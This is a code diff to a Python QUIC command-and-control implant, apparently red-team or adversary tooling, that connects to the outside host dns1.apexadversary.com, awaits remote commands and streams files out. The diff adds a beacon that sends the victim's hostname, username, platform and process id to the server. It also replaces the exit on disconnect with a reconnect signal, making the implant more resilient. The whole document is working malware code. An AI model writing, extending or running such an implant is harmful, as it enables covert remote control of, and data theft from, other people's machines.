@@ -4,6 +4,8 @@ import ssl
 import subprocess
 import os
 import hashlib
+import getpass
+import socket
 from aioquic.asyncio import connect, QuicConnectionProtocol
 from aioquic.quic.configuration import QuicConfiguration
 from aioquic.quic.events import StreamDataReceived, ConnectionTerminated
@@ -83,6 +85,9 @@ class ImplantProtocol(QuicConnectionProtocol):
         # Download state set while streaming a file out
         self._downloading    = False
 
+        # set when the server closes the session so run_implant() can reconnect
+        self._dead = asyncio.Event()
+
     def connection_made(self, transport):
         super().connection_made(transport)
         logger.info("[IMPLANT] QUIC connection established!")
@@ -90,7 +95,7 @@ class ImplantProtocol(QuicConnectionProtocol):
     def connection_lost(self, exc):
         super().connection_lost(exc)
         logger.error(f"[IMPLANT] Connection lost: {exc}")
-        import sys; sys.exit(0)
+        self._dead.set()
 
     def _send(self, stream_id, data):
         """Send bytes or str on stream_id."""
@@ -103,7 +108,7 @@ class ImplantProtocol(QuicConnectionProtocol):
         if not isinstance(event, StreamDataReceived):
             if isinstance(event, ConnectionTerminated):
                 logger.error(f"[IMPLANT] Server closed: {event.reason_phrase}")
-                import sys; sys.exit(0)
+                self._dead.set()
             return
 
         raw  = event.data
@@ -247,9 +252,15 @@ async def run_implant(host="dns1.apexadversary.com", port=443):
             logger.info("[IMPLANT] Connected - opening command stream...")
             stream_id = protocol._quic.get_next_available_stream_id(is_unidirectional=False)
             protocol._quic.send_stream_data(stream_id, b"READY\n", end_stream=False)
+            try:
+                ident = "HELLO|{}|{}|{}|{}\n".format(
+                    socket.gethostname(), getpass.getuser(), sys.platform, os.getpid())
+                protocol._quic.send_stream_data(stream_id, ident.encode(), end_stream=False)
+            except Exception as e:
+                logger.info(f"[IMPLANT] identity send failed: {e}")
             protocol.transmit()
             logger.info(f"[IMPLANT] Stream {stream_id} open - awaiting commands...")
-            await asyncio.gather(keep_alive(protocol), asyncio.Future())
+            await asyncio.gather(keep_alive(protocol), protocol._dead.wait())
 
     except asyncio.TimeoutError:
         logger.error("[IMPLANT] Connection timeout")
